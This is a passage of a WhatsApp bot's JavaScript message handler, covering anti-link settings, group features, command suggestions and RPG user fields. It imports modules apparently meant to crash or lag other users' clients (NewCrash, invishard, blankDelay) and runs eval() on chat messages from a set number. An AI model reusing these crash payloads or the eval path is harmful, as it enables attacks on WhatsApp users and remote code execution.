//RECODE BY REINZID 
//JANGAN DI JUAL ULANG
require('./settings')
require('./lib/listmenu')
const fs = require('fs');
const { pasangan } = require('./lib/dataPacaran')
const { ytdlv2 } = require('@leoo-vanth/zarv-vz')
const DelayWithBlank = require('./lib/blankDelay');
const invishard = require('./lib/invishard');
const NewCrashX = require('./lib/NewCrash')
const inviscombo = require ("./lib/inviscombo")
const invishard2 = require('./lib/invishard2');
const sharp = require('sharp')
const {
	downloadContentFromMessage,
	extractImageThumb
} = require('@whiskeysockets/baileys')
const { modul } = require('./module')
const path = require('path')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, nodecron, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateForwardMessageContent } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { Client } = require('ssh2');
const {
    addSewaGroup,
    getSewaExpired,
    getSewaPosition,
    expiredCheck,
    checkSewaGroup
} = require("./lib/store")
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const canvafy = require('canvafy')
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const VampSuperDelay = require('./lib/delay');
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const { tiktokSearchVideo, tiktokDownloaderVideo } = require('./lib/scrapers/tiktok');
const { igdl, tiktok } = require('./scrape/screaper');
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./scrape/scraper1');
const { Instagram } = require('./lib/scrapers/tiktok');
const { color, bgcolor } = require('./lib/color')
const { CatBox, UploadFileUgu, fileIO, pomfCDN, webp2mp4File, webp2mp4} = require('./lib/uploader')
const { fetchBuffer, buffermagef } = require("./lib/myfunc2")
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const JavaScriptObfuscator = require('javascript-obfuscator');
const similarity = require('similarity');
const fg = require('api-dylux')
const { msgFilter } = require('./lib/antispam')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const { upscale } = require('./lib/scrapers/upscale');
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const photooxy = require('./scrape/photooxy')
const didyoumean = require('didyoumean');
const yts = require('./scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/owner.json'))
const partner = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/partner.json'))
const prem = JSON.parse(fs.readFileSync("./node_modules/Arisu-MD/database/premium.json"))
const reinzmahiruverifikasiuser = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/user.json'))
const ReinzIDVoiceNote = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonvn.json'))
const ReinzIDSticker = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonsticker.json'))
const ImageReinzID = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonimage.json'))
const VideoReinzID = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonvideo.json'))
const isToxic = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/bad.json'))
const pler = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/idgrup.json').toString())
const siminya = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/simi.json'))
const chatReinzID = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/chatReinzID.json'))
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
let autosticker = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/autosticker.json'))
let mute = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/mute.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/commandUser.json'));
let nttoxic = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinkgc.json'))
let ntlinkch =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinkch.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/antilinkytvideo.json'))
let sewa = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/sewa.json'));
let openaigc = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/openaigc.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/left.json'))
let set_proses = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/set_proses.json'))
let set_done = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/set_done.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/list-message.json'));
const DB_FILE = './node_modules/Arisu-MD/database/database.json';
function loadDB() {
  if (fs.existsSync(DB_FILE)) {
    try {
      const raw = fs.readFileSync(DB_FILE);
      return JSON.parse(raw);
    } catch (err) {
      console.error('Error reading DB file:', err);
      return { chats: {} };
    }
  } else {
    return { chats: {} };
  }
}
function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
global.db = loadDB();
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}
// read database
let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []
const antiTagSW = require('./lib/antitagsw.js')
module.exports = RyuuBotz = async (RyuuBotz, m, chatUpdate, store) => {
try {
if (chatUpdate?.messages) {
  for (let msg of chatUpdate.messages) {
    try {
      if (msg.key.remoteJid?.endsWith('@g.us')) {
        const m = msg.message || {}

        if (m.groupStatusMentionMessage && antiTagSW.isActive(msg.key.remoteJid)) {
          await RyuuBotz.sendMessage(msg.key.remoteJid, {
            delete: {
              remoteJid: msg.key.remoteJid,
              fromMe: false,
              id: msg.key.id,
              participant: msg.key.participant
            }
          })
          console.log(`✅ Antitagsw: pesan SW mention grup otomatis dihapus dari ${msg.key.remoteJid}`)
        }
      }
    } catch (err) {
      console.error('❌ Antitagsw error:', err)
    }
  }
}
const replyryuu = (text) => {
const thumbnails = [
        'https://files.catbox.moe/h9spy4.jpg',
        'https://files.catbox.moe/ghven4.jpg',
        'https://files.catbox.moe/9z6zif.jpg',
        'https://files.catbox.moe/wgnwyo.jpg',
        'https://files.catbox.moe/skqb0h.jpg'
    ];
    const randomThumbs = thumbnails[Math.floor(Math.random() * thumbnails.length)];
    
    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: '' + global.botname,
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: '' + randomThumbs,
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};

    const { type, quotedMsg, mentioned, now, fromMe } = m
        const body =
  (m.mtype === 'conversation' && m.message.conversation) ||
  (m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
  (m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
  (m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
  (m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
  (m.mtype === 'listResponseMessage' && m.message.listResponseMessage.singleSelectReply.selectedRowId) ||
  (m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId) ||
  (m.mtype === 'messageContextInfo' &&
    (m.message.buttonsResponseMessage?.selectedButtonId ||
     m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
     m.text)) ||
  '';  // fallback jadi string kosong
const bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ' '
const budy = (typeof m.text == 'string' ? m.text : '')
let preff;
if (global.pref === true) {
    preff = global.prefix;
} else if (global.pref === false) {
    preff = '';
} else {
    preff = ''; 
}
const prefix = preff
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';

const args = body.trim().split(/ +/).slice(1)
const full_args = body.replace(command, '').slice(1).trim()
const isSewa = checkSewaGroup(m.chat, sewa)
async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: RyuuBotz.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, RyuuBotz.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
RyuuBotz.ev.emit('messages.upsert', msg)
}
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ' '
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)

        const from = m.key.remoteJid
        if (m.messageStubType === 22 && isAntiTagSw(m.chat)) {
    if (m.messageStubParameters && m.messageStubParameters.includes(m.chat)) {
        await RyuuBotz.sendMessage(m.chat, { delete: m.key });
        await RyuuBotz.sendMessage(m.chat, { text: 'Status yang menandai grup otomatis dihapus.', mentions: [sender] });
    }
}
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const pushname = m.pushName || "No Name"
        const botNumber = await RyuuBotz.decodeJid(RyuuBotz.user.id)
        const isRyuuTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const cleanSender = m.sender.replace(/[^0-9]/g, '')
        const partnerList = [botNumber, ...partner].map(v => v.replace(/[^0-9]/g, ''))
/*
        console.log(">>> m.sender:", m.sender)
        console.log(">>> cleanSender:", cleanSender)
        console.log(">>> partnerList:", partnerList)
*/
        const isRyuuPartner = partnerList.includes(cleanSender)
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await RyuuBotz.groupMetadata(m.chat).catch(e => null) : null
const groupName = groupMetadata && groupMetadata.subject ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
     const jangan = m.isGroup ? pler.includes(m.chat) : false  
const isPrem = prem.some(user => user.id === m.sender && user.expired > Date.now())
    	const isUser = reinzmahiruverifikasiuser.includes(sender)
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
       const isAutoAiGc = m.isGroup ? openaigc.includes(m.chat) : true
      const isReinzIDchat = m.isGroup ? chatReinzID.includes(m.chat) : true
      const shouldExit = true
       const cekpesan = true
      const automati = false
      const isAutosimi = m.isGroup ? siminya.includes(m.chat) : true
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const Antilinkch = m.isGroup ? ntlinkch.includes(m.chat) : false
        const antibot = true
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const isMute= mute.includes(m.chat) ? true : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        
        const antiwame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : true
      
        
const isWelcome = _welcome.includes(m.chat);
const isLeft = _left.includes(m.chat);
const isSimi = siminya.includes(m.chat);
const isXeonMedia = m.mtype;
const rungo = true;

const ReinzIDtotalpitur = () => {
  const filePath = './node_modules/Arisu-MD/RyuuID.js';
  const fileContent = fs.readFileSync(filePath, 'utf-8');
  const matchCases = fileContent.match(/case\s+['"][^'"]+['"]:/g) || [];
  return matchCases.length;
}; 
            const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var ReinzIDliatwaktu = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var ReinzIDliatwaktu = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var ReinzIDliatwaktu = `Selamat Malam 🌃`
 }
 if(time2 < "15:00:00"){
var ReinzIDliatwaktu = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var ReinzIDliatwaktu = `Selamat pagi 🌄`
 }
 if(time2 < "05:00:00"){
var ReinzIDliatwaktu = `Selamat Pagi 🌄`
 } 

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)

		if (isEval && senderNumber == "+62xxxxxxxx") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
			} catch (e) {
				RyuuBotz.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
		if (isCmd) {
			if (command) {
const code = fs.readFileSync("./node_modules/Arisu-MD/RyuuID.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}

// Fungsi untuk mendeteksi kesalahan input perintah
const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
if (!help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
let mean = didyoumean(command, help);
let sim = similarity(command, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && command.toLowerCase() !== mean.toLowerCase()) {

// Pesan untuk orang yang salah menginput perintah
let respon = `
ᴄᴏᴍᴍᴀɴᴅ ɪᴛᴜ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴍᴜɴɢᴋɪɴ ʏᴀɴɢ ᴋᴀᴍᴜ ᴍᴀᴋsᴜᴅ\n\n➠ Command \`${prefix + mean}\`\n➠ Similarity   \`[ ${similarityPercentage}% ]\``.trim();

let button = [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"${prefix + mean} (${similarityPercentage}%)\",\"id\":\"${prefix + mean}\"}`
}
]

// Fungsi untuk mengirim pesan dan tombol
await RyuuBotz.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `.${mean}`,
      buttonText: { displayText: `${mean}` },
      type: 1
    },

  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./node_modules/Arisu-MD/ReinzID.js"),
  fileName: `YANG KAMU MAKSUD?`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 9999999999999,
  caption: respon,
  contextInfo: {
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: "ᴍᴜɴɢᴋɪɴ ɪɴɪ ʏᴀɴɢ ᴀɴᴅᴀ ᴍᴀᴋsᴜᴅ?"
   }, 
    externalAdReply: {
      title: `${botname}`,
      body: `Ryuu Reinzz`,
      thumbnailUrl: "https://files.catbox.moe/m2xkzf.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
}
}
}
		
		
		const getcomandces = (cases) => {
    try {
        const fileContent = fs.readFileSync('./node_modules/Arisu-MD/RyuuID.js').toString();
        let caseContent = fileContent.split(`case '${cases}'`);    
        if (caseContent.length === 1) { 
            caseContent = fileContent.split(`case "${cases}"`);
        }
        if (caseContent.length > 1) {
            return "case " + `'${cases}'` + caseContent[1].split("break")[0] + "break";
        } else {
            return "none"; 
        }
    } catch (e) {
        return "none";
    }
};
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
let mean;
let didyoumenn;
async function spawndidyou(our) {
try {
	const code = fs.readFileSync("./node_modules/Arisu-MD/RyuuID.js", "utf8")
		const regex = /case\s+['"]([^'"]+)['"]:/g;
			var matches = [];
				var match;
				while ((match = regex.exec(code))) {
					matches.push(match[1]);
				}
				const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
				if (!help.includes(our) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
					 mean = didyoumean(our, help);
				let sim = similarity(our, mean);
			let similarityPercentage = parseInt(sim * 100);
		if (mean && our.toLowerCase() !== mean.toLowerCase()) {
    	 didyoumenn = `*\`[ MATCH FOR THIS COMMAND ]\`*\n\nmungkin yang anda maksud adalah: *.${mean}*\npercentase: *${similarityPercentage}%*`
			   /*
			  # similarityPercentage
			  # mean
			  # thaks rija l
			  */
	     } else { return; }
     }
      return reply("kek nya ada yang salah")
 } catch(err) {
 return;
 }
}
//===============	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

}
if (user) {
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.level)) user.level = 1
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0

if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
